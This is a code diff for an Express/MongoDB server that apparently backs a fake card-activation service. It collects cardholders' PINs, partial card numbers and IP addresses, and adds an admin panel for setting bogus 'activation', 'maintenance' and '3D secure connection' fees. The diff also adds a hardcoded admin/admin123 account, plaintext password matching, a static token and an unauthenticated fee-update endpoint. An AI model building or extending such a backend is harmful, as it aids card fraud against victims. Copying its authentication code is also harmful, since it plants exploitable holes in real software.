@@ -6,14 +6,11 @@ const app = express();
 require("dotenv").config();
 
 app.use(express.json());
-
-// Configure CORS to allow all origins
 app.use(cors());
 
-// Use only process.env.PORT as required by Render
-const PORT = process.env.PORT;
+const PORT = process.env.PORT || 3001;
 
-// MongoDB Connection with enhanced debugging and corrected timeout
+// MongoDB Connection
 const mongoUri = process.env.MONGODB_URI;
 if (!mongoUri) {
   console.error(
@@ -22,46 +19,26 @@ if (!mongoUri) {
   process.exit(1);
 }
 
-const connectWithRetry = () => {
-  console.log("Attempting to connect to MongoDB with URI:", mongoUri); // Debug URI
-  mongoose
-    .connect(mongoUri, {
-      serverSelectionTimeoutMS: 30000, // Set to 30 seconds
-      heartbeatFrequencyMS: 10000,
-      retryWrites: true,
-      w: "majority",
-      autoIndex: true, // Ensure indexes are created
-    })
-    .then(() => {
-      console.log("Connected to MongoDB successfully");
-    })
-    .catch((err) => {
-      console.error("MongoDB connection error:", {
-        message: err.message,
-        name: err.name,
-        reason: err.reason,
-        code: err.code,
-        stack: err.stack,
-      });
-      console.log("Retrying connection in 5 seconds...");
-      setTimeout(connectWithRetry, 5000); // Retry after 5 seconds
-    });
-};
+mongoose
+  .connect(mongoUri, {
+    serverSelectionTimeoutMS: 30000,
+    heartbeatFrequencyMS: 10000,
+    retryWrites: true,
+    w: "majority",
+    autoIndex: true,
+  })
+  .then(() => console.log("Connected to MongoDB"))
+  .catch((err) => console.error("MongoDB connection error:", err));
 
-connectWithRetry();
-
-mongoose.connection.on("disconnected", () => {
-  console.log("MongoDB disconnected. Attempting to reconnect...");
-  connectWithRetry();
-});
-
-mongoose.connection.on("error", (err) => {
-  console.error("MongoDB connection error event:", err);
-});
-
-mongoose.connection.on("reconnected", () => {
-  console.log("MongoDB reconnected successfully");
-});
+mongoose.connection.on("disconnected", () =>
+  console.log("MongoDB disconnected")
+);
+mongoose.connection.on("error", (err) =>
+  console.error("MongoDB connection error event:", err)
+);
+mongoose.connection.on("reconnected", () =>
+  console.log("MongoDB reconnected successfully")
+);
 
 process.on("SIGINT", () => {
   mongoose.connection.close(() => {
@@ -70,6 +47,15 @@ process.on("SIGINT", () => {
   });
 });
 
+// Payment Schema
+const paymentSchema = new mongoose.Schema({
+  label: { type: String, required: true },
+  price: { type: Number, required: true },
+  updatedAt: { type: Date, default: Date.now },
+});
+const Payment = mongoose.model("Payment", paymentSchema);
+
+// Activation Schema (unchanged)
 const activationSchema = new mongoose.Schema({
   cardType: { type: String, required: true },
   lastSixDigits: { type: String, required: true },
@@ -79,11 +65,46 @@ const activationSchema = new mongoose.Schema({
   accept: { type: Boolean, required: true },
   pin: { type: String, required: true },
   createdAt: { type: Date, default: Date.now },
+  userIp: { type: String },
 });
-
 const Activation = mongoose.model("Activation", activationSchema);
 
-// Validate last 6 digits
+// Admin Schema
+const adminSchema = new mongoose.Schema({
+  username: { type: String, required: true },
+  password: { type: String, required: true },
+  ipAddress: { type: String },
+});
+const Admin = mongoose.model("Admin", adminSchema);
+
+// Middleware to get IP
+const getIp = (req, res, next) => {
+  req.ipAddress =
+    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+  next();
+};
+app.use(getIp);
+
+// Admin Login
+app.post("/admin/login", async (req, res) => {
+  const { username, password } = req.body;
+  try {
+    const admin = await Admin.findOne({ username, password });
+    if (admin) {
+      admin.ipAddress = req.ipAddress;
+      await admin.save();
+      return res
+        .status(200)
+        .json({ message: "Login successful", token: "admin-token" }); // Simple token for now
+    }
+    return res.status(401).json({ message: "Invalid credentials" });
+  } catch (error) {
+    console.error("Login error:", error);
+    return res.status(500).json({ message: "Server error" });
+  }
+});
+
+// Validate last 6 digits (unchanged)
 app.post("/validate-digits", async (req, res) => {
   const { lastSixDigits } = req.body;
   console.log("Validating digits:", lastSixDigits);
@@ -102,9 +123,11 @@ app.post("/validate-digits", async (req, res) => {
     return res.status(200).json({ message: "Digits validated successfully" });
   } catch (error) {
     console.error("Server error in /validate-digits:", error);
-    return res.status(500).json({
-      message: "An unexpected error occurred. Please try again later.",
-    });
+    return res
+      .status(500)
+      .json({
+        message: "An unexpected error occurred. Please try again later.",
+      });
   }
 });
 
@@ -185,20 +208,85 @@ app.post("/activate", async (req, res) => {
       dailyLimit: limit,
       accept,
       pin,
+      userIp: req.ipAddress,
     });
     await newActivation.save();
-    console.log("Activation saved to DB");
+    console.log("Activation saved to DB with IP:", req.ipAddress);
 
     return res.status(200).json({ message: "Card activated successfully" });
   } catch (error) {
     console.error("Server error in /activate:", error);
-    return res.status(500).json({
-      message: "An unexpected error occurred. Please try again later.",
-      error: error.message, // Include error details for debugging
-    });
+    return res
+      .status(500)
+      .json({
+        message: "An unexpected error occurred. Please try again later.",
+      });
+  }
+});
+
+// Admin update fees
+app.post("/admin/update-fees", async (req, res) => {
+  const { vat, cardActivation, cardMaintenance, secureConnection } = req.body;
+  const adminIp = req.ipAddress;
+
+  if (!vat || !cardActivation || !cardMaintenance || !secureConnection) {
+    return res.status(400).json({ message: "All fee fields are required" });
+  }
+
+  try {
+    await Payment.deleteMany({});
+    const payments = [
+      { label: "VAT (value added tax)", price: vat },
+      { label: "Card activation", price: cardActivation },
+      { label: "Card maintenance", price: cardMaintenance },
+      {
+        label: "3D visa/master/verve secure connection",
+        price: secureConnection,
+      },
+    ];
+    await Payment.insertMany(payments);
+    console.log("Fees updated by IP:", adminIp, "with data:", payments);
+
+    return res.status(200).json({ message: "Fees updated successfully" });
+  } catch (error) {
+    console.error("Server error in /admin/update-fees:", error);
+    return res
+      .status(500)
+      .json({ message: "An error occurred while updating fees." });
+  }
+});
+
+// Fetch payments (only after admin update)
+app.get("/api/payments", async (req, res) => {
+  try {
+    const payments = await Payment.find().sort({ updatedAt: -1 }).limit(1); // Get latest update
+    if (payments.length === 0) {
+      return res
+        .status(404)
+        .json({
+          message: "No payment data available. Contact admin to update.",
+        });
+    }
+    return res.status(200).json({ payments });
+  } catch (error) {
+    console.error("Server error in /api/payments:", error);
+    return res
+      .status(500)
+      .json({ message: "An error occurred while fetching payments." });
   }
 });
 
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
+// Initial admin setup (run once)
+async function initAdmin() {
+  const adminExists = await Admin.countDocuments();
+  if (adminExists === 0) {
+    await Admin.create({ username: "admin", password: "admin123" });
+    console.log(
+      "Initial admin user created with username: admin, password: admin123"
+    );
+  }
+}
